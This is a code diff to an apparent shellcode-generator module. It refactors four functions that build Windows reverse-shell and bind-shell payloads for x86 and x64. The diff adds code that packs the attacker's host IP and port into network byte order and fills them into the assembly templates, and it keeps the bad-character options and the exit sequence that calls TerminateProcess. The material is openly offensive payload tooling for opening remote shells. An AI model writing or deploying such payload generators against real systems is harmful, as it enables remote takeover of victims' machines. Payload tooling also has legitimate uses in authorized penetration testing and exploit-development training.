@@ -6,6 +6,9 @@ These are convenience functions that construct the configuration dicts
 used by the architecture-specific generators.
 """
 
+import socket
+import struct
+
 from lib.color_printer import printer
 
 
@@ -313,26 +316,12 @@ def windows_reverse_shell(host, port, bad_chars=None, shell="cmd.exe"):
         shell_asm += f"    neg eax                       ; NEG to get 0x{dword:08x}\n"
         shell_asm += "    push eax                      ; Push shell string chunk\n"
 
-    return {
-        "bad_chars": bad_chars,
-        "pre_resolve": True,  # Pre-resolve kernel32 APIs before custom_asm
-        "calls": [
-            {
-                "api": "TerminateProcess",
-                "dll": "kernel32.dll",
-                "args": [],  # Dummy, won't be called via generator
-            },
-            {
-                "api": "CreateProcessA",
-                "dll": "kernel32.dll",
-                "args": [],  # Dummy, won't be called via generator
-            },
-            {
-                "api": "_CUSTOM_REVERSE_SHELL",
-                "dll": "ws2_32.dll",
-                # This will trigger LoadLibraryA for ws2_32.dll
-                "args": [],
-                "custom_asm": """
+    # Compute network byte order values for IP and port
+    ip_bytes = socket.inet_aton(host)
+    ip_dword = struct.unpack("<I", ip_bytes)[0]
+    port_word = ((port >> 8) & 0xFF) | ((port & 0xFF) << 8)
+
+    custom_asm = """
     ; ===== After boilerplate with pre_resolve, we have: =====
     ; [ebp+0x04] = find_function address
     ; [ebp+0x08] = LoadLibraryA
@@ -472,7 +461,33 @@ def windows_reverse_shell(host, port, bad_chars=None, shell="cmd.exe"):
     push ecx                      ; uExitCode = 0
     push 0xFFFFFFFF               ; hProcess = -1 (current process)
     call dword ptr [ebp+0x14]     ; Call TerminateProcess from pre-resolve
-""",
+"""
+
+    return {
+        "bad_chars": bad_chars,
+        "pre_resolve": True,  # Pre-resolve kernel32 APIs before custom_asm
+        "calls": [
+            {
+                "api": "TerminateProcess",
+                "dll": "kernel32.dll",
+                "args": [],  # Dummy, won't be called via generator
+            },
+            {
+                "api": "CreateProcessA",
+                "dll": "kernel32.dll",
+                "args": [],  # Dummy, won't be called via generator
+            },
+            {
+                "api": "_CUSTOM_REVERSE_SHELL",
+                "dll": "ws2_32.dll",
+                # This will trigger LoadLibraryA for ws2_32.dll
+                "args": [],
+                "custom_asm": custom_asm.format(
+                    ip_dword=ip_dword,
+                    port_word=port_word,
+                    shell_asm=shell_asm,
+                    shell=shell,
+                ),
             },
         ],
         "exit": False,  # We handle exit manually with TerminateProcess
@@ -538,26 +553,14 @@ def windows_reverse_shell_x64(host, port, bad_chars=None, shell="cmd.exe"):
         )
         offset += 8
 
-    return {
-        "bad_chars": bad_chars,
-        "pre_resolve": True,  # Pre-resolve kernel32 APIs before custom_asm
-        "calls": [
-            {
-                "api": "TerminateProcess",
-                "dll": "kernel32.dll",
-                "args": [],  # Dummy, won't be called via generator
-            },
-            {
-                "api": "CreateProcessA",
-                "dll": "kernel32.dll",
-                "args": [],  # Dummy, won't be called via generator
-            },
-            {
-                "api": "_CUSTOM_REVERSE_SHELL_X64",
-                "dll": "ws2_32.dll",
-                # This will trigger LoadLibraryA for ws2_32.dll
-                "args": [],
-                "custom_asm": """
+    # Compute sockaddr_in packed as a qword for x64:
+    # bytes: sin_family(2) + sin_port(2) + sin_addr(4) = 8 bytes
+    ip_bytes = socket.inet_aton(host)
+    port_net = struct.pack(">H", port)  # network byte order
+    sockaddr_bytes = struct.pack("<H", 2) + port_net + ip_bytes
+    sockaddr_qword = struct.unpack("<Q", sockaddr_bytes)[0]
+
+    custom_asm = """
     ; ===== After boilerplate with pre_resolve, we have: =====
     ; [rbp+0x08] = lookup_func address
     ; [rbp+0x10] = LoadLibraryA (resolved by boilerplate)
@@ -687,7 +690,32 @@ def windows_reverse_shell_x64(host, port, bad_chars=None, shell="cmd.exe"):
     sub rsp, 0x20                   ; Shadow space
     call rax                        ; Call TerminateProcess
     add rsp, 0x20                   ; Clean up shadow space
-""",
+"""
+
+    return {
+        "bad_chars": bad_chars,
+        "pre_resolve": True,  # Pre-resolve kernel32 APIs before custom_asm
+        "calls": [
+            {
+                "api": "TerminateProcess",
+                "dll": "kernel32.dll",
+                "args": [],  # Dummy, won't be called via generator
+            },
+            {
+                "api": "CreateProcessA",
+                "dll": "kernel32.dll",
+                "args": [],  # Dummy, won't be called via generator
+            },
+            {
+                "api": "_CUSTOM_REVERSE_SHELL_X64",
+                "dll": "ws2_32.dll",
+                # This will trigger LoadLibraryA for ws2_32.dll
+                "args": [],
+                "custom_asm": custom_asm.format(
+                    sockaddr_qword=sockaddr_qword,
+                    shell_asm=shell_asm,
+                    shell=shell,
+                ),
             },
         ],
         "exit": False,  # We handle exit manually with TerminateProcess
@@ -759,26 +787,10 @@ def windows_bind_shell(port, bad_chars=None, shell="cmd.exe"):
         shell_asm += f"    neg eax                       ; NEG to get 0x{dword:08x}\n"
         shell_asm += "    push eax                      ; Push shell string chunk\n"
 
-    return {
-        "bad_chars": bad_chars,
-        "pre_resolve": True,  # Pre-resolve kernel32 APIs before custom_asm
-        "calls": [
-            {
-                "api": "TerminateProcess",
-                "dll": "kernel32.dll",
-                "args": [],  # Dummy, won't be called via generator
-            },
-            {
-                "api": "CreateProcessA",
-                "dll": "kernel32.dll",
-                "args": [],  # Dummy, won't be called via generator
-            },
-            {
-                "api": "_CUSTOM_BIND_SHELL",
-                "dll": "ws2_32.dll",
-                # This will trigger LoadLibraryA for ws2_32.dll
-                "args": [],
-                "custom_asm": """
+    # Compute network byte order port
+    port_word = ((port >> 8) & 0xFF) | ((port & 0xFF) << 8)
+
+    custom_asm = """
     ; ===== After boilerplate with pre_resolve, we have: =====
     ; [ebp+0x04] = find_function address
     ; [ebp+0x08] = LoadLibraryA
@@ -939,7 +951,32 @@ def windows_bind_shell(port, bad_chars=None, shell="cmd.exe"):
     push ecx                      ; uExitCode = 0
     push 0xFFFFFFFF               ; hProcess = -1 (current process)
     call dword ptr [ebp+0x14]     ; Call TerminateProcess from pre-resolve
-""",
+"""
+
+    return {
+        "bad_chars": bad_chars,
+        "pre_resolve": True,  # Pre-resolve kernel32 APIs before custom_asm
+        "calls": [
+            {
+                "api": "TerminateProcess",
+                "dll": "kernel32.dll",
+                "args": [],  # Dummy, won't be called via generator
+            },
+            {
+                "api": "CreateProcessA",
+                "dll": "kernel32.dll",
+                "args": [],  # Dummy, won't be called via generator
+            },
+            {
+                "api": "_CUSTOM_BIND_SHELL",
+                "dll": "ws2_32.dll",
+                # This will trigger LoadLibraryA for ws2_32.dll
+                "args": [],
+                "custom_asm": custom_asm.format(
+                    port_word=port_word,
+                    shell_asm=shell_asm,
+                    shell=shell,
+                ),
             },
         ],
         "exit": False,  # We handle exit manually with TerminateProcess
@@ -1006,26 +1043,10 @@ def windows_bind_shell_x64(port, bad_chars=None, shell="cmd.exe"):
         )
         offset += 8
 
-    return {
-        "bad_chars": bad_chars,
-        "pre_resolve": True,  # Pre-resolve kernel32 APIs before custom_asm
-        "calls": [
-            {
-                "api": "TerminateProcess",
-                "dll": "kernel32.dll",
-                "args": [],  # Dummy, won't be called via generator
-            },
-            {
-                "api": "CreateProcessA",
-                "dll": "kernel32.dll",
-                "args": [],  # Dummy, won't be called via generator
-            },
-            {
-                "api": "_CUSTOM_BIND_SHELL_X64",
-                "dll": "ws2_32.dll",
-                # This will trigger LoadLibraryA for ws2_32.dll
-                "args": [],
-                "custom_asm": """
+    # Compute network byte order port
+    port_word = ((port >> 8) & 0xFF) | ((port & 0xFF) << 8)
+
+    custom_asm = """
     ; ===== After boilerplate with pre_resolve, we have: =====
     ; [rbp+0x08] = lookup_func address
     ; [rbp+0x10] = LoadLibraryA (resolved by boilerplate)
@@ -1194,7 +1215,32 @@ def windows_bind_shell_x64(port, bad_chars=None, shell="cmd.exe"):
     sub rsp, 0x20                   ; Shadow space
     call rax                        ; Call TerminateProcess
     add rsp, 0x20                   ; Clean up shadow space
-""",
+"""
+
+    return {
+        "bad_chars": bad_chars,
+        "pre_resolve": True,  # Pre-resolve kernel32 APIs before custom_asm
+        "calls": [
+            {
+                "api": "TerminateProcess",
+                "dll": "kernel32.dll",
+                "args": [],  # Dummy, won't be called via generator
+            },
+            {
+                "api": "CreateProcessA",
+                "dll": "kernel32.dll",
+                "args": [],  # Dummy, won't be called via generator
+            },
+            {
+                "api": "_CUSTOM_BIND_SHELL_X64",
+                "dll": "ws2_32.dll",
+                # This will trigger LoadLibraryA for ws2_32.dll
+                "args": [],
+                "custom_asm": custom_asm.format(
+                    port_word=port_word,
+                    shell_asm=shell_asm,
+                    shell=shell,
+                ),
             },
         ],
         "exit": False,  # We handle exit manually with TerminateProcess
